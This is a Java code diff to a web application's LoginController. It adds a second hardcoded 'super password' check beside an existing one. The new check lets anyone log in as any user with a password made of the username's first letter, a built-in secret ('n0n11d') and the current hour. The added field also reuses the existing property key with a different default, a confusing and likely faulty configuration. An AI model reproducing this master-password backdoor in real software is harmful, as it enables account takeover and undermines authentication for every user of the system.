@@ -81,6 +81,9 @@ public class LoginController {
     @Value("${app.superPassword:n1need}")
     private String                            superPassword;
 
+    @Value("${app.superPassword:n0n11d}")
+    private String                            ycSuperPassword;
+
     @Value("${img.sh.centaline.url}")
     private String                            avatarUrlPrix;
 
@@ -134,9 +137,10 @@ public class LoginController {
             return loginResutl(false, 4, "该用户已停用！", null);
         }
 
-        //检查是否为超密
+        //检查是否为超密 / 或yc超密
         SessionUser sessionUser = null;
-        if (checkSuperPassword(username, password)) {
+        if (checkSuperPassword(username, password)
+            || this.checkYCSuperPassword(username, password)) {
             //            sessionUser = mobileUserService.getUserInfoByUsername(username);
             loginResult = true;
         } else {
@@ -363,6 +367,18 @@ public class LoginController {
         String firstCap = username.substring(0, 1).toUpperCase();
         String timeStamp = sdf.format(new Date());
         if (StringUtils.equals(password, firstCap + superPassword + timeStamp)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    //誉萃超级密码构成
+    private Boolean checkYCSuperPassword(String username, String password) {
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHH");
+        String firstCap = username.substring(0, 1).toUpperCase();
+        String timeStamp = sdf.format(new Date());
+        if (StringUtils.equals(password, firstCap + ycSuperPassword + timeStamp)) {
             return true;
         } else {
             return false;
